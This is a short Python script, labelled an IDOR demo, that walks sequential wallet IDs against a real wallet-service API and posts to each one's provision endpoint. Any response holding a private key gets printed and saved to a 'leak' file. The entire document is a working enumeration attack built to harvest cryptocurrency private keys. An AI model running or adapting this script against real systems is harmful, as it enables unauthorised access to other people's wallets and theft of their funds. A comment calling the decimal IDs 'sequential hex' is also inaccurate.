import requests
import json

print("Privy Wallet IDOR Demo – Test Wallet Provisioning")
app_id = input("Paste your appId from dashboard: ")

# Test sequential IDs (change range for more)
for i in range(1, 11):
    wallet_id = f"wlt_00000000000{i:03d}"  # Sequential hex
    url = f"https://api.privy.io/api/v1/wallets/{wallet_id}/provision"
    payload = {"appId": app_id}

    print(f"Trying {wallet_id} ...")
    r = requests.post(url, json=payload)
    data = r.json()

    if "privateKey" in data:
        print("\nHIT! Leaked Wallet:")
        print(json.dumps(data, indent=2))
        with open(f"leak_{wallet_id}.json", "w") as f:
            json.dump(data, f, indent=2)
        print(f"Saved leak_{wallet_id}.json")
print("\nDone – check files for leaks")
